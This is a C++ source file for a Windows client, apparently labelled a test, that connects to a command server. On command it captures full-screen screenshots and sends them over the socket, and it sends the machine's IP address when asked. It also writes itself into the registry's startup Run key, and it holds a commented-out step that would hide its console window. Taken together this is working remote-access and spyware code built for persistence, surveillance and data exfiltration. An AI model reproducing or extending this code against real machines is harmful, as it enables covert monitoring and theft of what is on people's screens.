#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h> // for inet_pton()
#include <Windows.h>
#include <fstream>
#include <thread>
#include <string>
#include <vector> // Include the vector header

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

#define DEFAULT_PORT 27015
#define DEFAULT_BUFLEN 4096

//AutoStart


bool askUserForAutoStart() {
    std::cout << "Do you want to run this app at Windows startup? (y/n): ";
    std::string response;
    std::getline(std::cin, response);

    return (response == "y" || response == "Y");
}

void addToCurrentUserAutoStart(const std::string& appName, const std::string& appPath) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), static_cast<DWORD>(appPath.length())) == ERROR_SUCCESS) {
            std::cout << "Auto-start added successfully for the current user." << std::endl;
        }
        else {
            std::cout << "Failed to add auto-start for the current user." << std::endl;
        }

        RegCloseKey(hKey);
    }
    else {
        std::cout << "Failed to open the registry key." << std::endl;
    }
}


void removeFromCurrentUserAutoStart(const std::string& appName) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegDeleteValueA(hKey, appName.c_str()) == ERROR_SUCCESS) {
            std::cout << "Auto-start entry removed successfully for the current user." << std::endl;
        }
        else {
            std::cout << "Failed to remove auto-start entry for the current user." << std::endl;
        }

        RegCloseKey(hKey);
    }
    else {
        std::cout << "Failed to open the registry key." << std::endl;
    }
}


//screnshot

void TakeScreenshot(const std::string& filename) {
    // Get the screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create a compatible bitmap
    HDC screenDC = GetDC(NULL);
    HDC memDC = CreateCompatibleDC(screenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(screenDC, screenWidth, screenHeight);

    // Select the bitmap into the memory DC
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(memDC, hBitmap);

    // Copy the screen contents to the memory DC
    BitBlt(memDC, 0, 0, screenWidth, screenHeight, screenDC, 0, 0, SRCCOPY);

    // Save the bitmap to a file
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwSizeofDIB;
    bmfHeader.bfType = 0x4D42; // BM

    std::ofstream file(filename, std::ios::out | std::ios::binary);
    if (!file) {
        std::cout << "Failed to open file: " << filename << std::endl;
        return;
    }

    file.write(reinterpret_cast<char*>(&bmfHeader), sizeof(BITMAPFILEHEADER));
    file.write(reinterpret_cast<char*>(&bi), sizeof(BITMAPINFOHEADER));

    char* lpbitmap = new char[dwBmpSize];
    GetDIBits(memDC, hBitmap, 0, bmp.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    file.write(lpbitmap, dwBmpSize);

    // Clean up
    file.close();
    delete[] lpbitmap;
    SelectObject(memDC, hOldBitmap);
    DeleteDC(memDC);
    ReleaseDC(NULL, screenDC);
    DeleteObject(hBitmap);
}



void SendFile(SOCKET clientSocket, const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) {
        std::cout << "Failed to open file: " << filename << std::endl;
        return;
    }

    // Get the file size
    file.seekg(0, std::ios::end);
    int fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // Read the file contents into a buffer
    std::vector<char> buffer(fileSize);
    file.read(buffer.data(), fileSize);

    // Send the file indicator to the server
    const char* fileIndicator = "FILE";
    if (send(clientSocket, fileIndicator, strlen(fileIndicator), 0) == SOCKET_ERROR) {
        std::cout << "Failed to send file indicator." << std::endl;
        return;
    }

    // Send the file size to the server
    if (send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(int), 0) == SOCKET_ERROR) {
        std::cout << "Failed to send file size." << std::endl;
        return;
    }

    // Send the file contents to the server
    int bytesSent = send(clientSocket, buffer.data(), fileSize, 0);
    if (bytesSent == SOCKET_ERROR) {
        std::cout << "Failed to send file data." << std::endl;
        return;
    }

    // Close the file
    file.close();
}



void SendIP(SOCKET clientSocket) {
    // Send an indicator message to the server
    const char* indicatorMsg = "IP data";
    if (send(clientSocket, indicatorMsg, (int)strlen(indicatorMsg), 0) == SOCKET_ERROR) {
        std::cout << "Failed to send IP address indicator to the server." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }
    else {
        std::cout << "Sending IP address to the server: " << std::endl;
    }

    // Get the machine's IP address
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {



        struct addrinfo hints;
        struct addrinfo* hostEntry = nullptr;

        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;

        if (getaddrinfo(hostname, nullptr, &hints, &hostEntry) == 0) {
            struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(hostEntry->ai_addr);
            char ipAddress[INET_ADDRSTRLEN];
            if (inet_ntop(AF_INET, &(addr->sin_addr), ipAddress, INET_ADDRSTRLEN) != nullptr) {
                // Construct the message with IP address
                std::string message = "";
                message += ipAddress;

                // Send the IP address to the server
                if (send(clientSocket, message.c_str(), (int)message.length(), 0) == SOCKET_ERROR) {
                    std::cout << "Failed to send IP address to the server." << std::endl;
                }
                else {
                    std::cout << "IP address sent to the server: " << ipAddress << std::endl;
                }
            }
            else {
                // Conversion failed
                std::cout << "Failed to convert the IP address." << std::endl;
            }
            freeaddrinfo(hostEntry);
        }
        else {
            int error = WSAGetLastError();
            std::cout << "Failed to retrieve the hostname. Error code: " << error << std::endl;
            return;
        }
    }
    else {
        int error = WSAGetLastError();
        std::cout << "Failed to retrieve the hostname. Error code: " << error << std::endl;
        return;
    }
}

void ReceiveMessages(SOCKET clientSocket) {
    char recvBuffer[DEFAULT_BUFLEN];
    int bytesReceived;

   
    //listen loop

    while (true) {
        bytesReceived = recv(clientSocket, recvBuffer, DEFAULT_BUFLEN - 1, 0);
        if (bytesReceived > 0) {
            recvBuffer[bytesReceived] = '\0';  // Null-terminate the received data

            // Message received
            std::cout << recvBuffer << std::endl;

            if (strcmp(recvBuffer, "shot") == 0) {
                // Take a screenshot
                TakeScreenshot("screenshot.bmp");
                std::cout << "Screenshot taken!" << std::endl;

                // Send the screenshot file to the server
                SendFile(clientSocket, "screenshot.bmp");
            }
            if (strcmp(recvBuffer, "IP request") == 0) {
                SendIP(clientSocket);
            }
        }
    }
}



int main() {
    WSADATA wsaData;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddress;

    //Autostart

    const std::string appName = "HH_test_client_";

    char buffer[MAX_PATH];
    if (GetModuleFileNameA(NULL, buffer, MAX_PATH) != 0) {
        std::string appPath(buffer);

        if (askUserForAutoStart()) {
            addToCurrentUserAutoStart(appName, appPath);
        }
        else {
            removeFromCurrentUserAutoStart(appName);
        }
    }
    else {
        std::cout << "Failed to retrieve the current location of the application." << std::endl;
    }


    // Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cout << "WSAStartup failed." << std::endl;
        return 1;
    }

    // Socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Server info
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(DEFAULT_PORT);

    // IP string to binary
    if (inet_pton(AF_INET, "127.0.0.5", &(serverAddress.sin_addr)) != 1) {
        std::cout << "Invalid address. Failed to convert IP address." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cout << "Failed to connect to the server." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // Send a connection message to the server
    const char* connectionMsg = "Client connected!";
    if (send(clientSocket, connectionMsg, (int)strlen(connectionMsg), 0) == SOCKET_ERROR) {
        std::cout << "Failed to send connection message to the server." << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    else {
        std::cout << "Connection message sent to the server." << std::endl;
    }

 

   

    // Create a thread to receive messages
    std::thread receiveThread(ReceiveMessages, clientSocket);

    // Hide the console window
    //HWND consoleWindow = GetConsoleWindow();
    //ShowWindow(consoleWindow, SW_HIDE);

    // Wait for the receive thread to finish
    receiveThread.join();

    // Close the socket and cleanup
    closesocket(clientSocket);
    WSACleanup();


    return 0;
}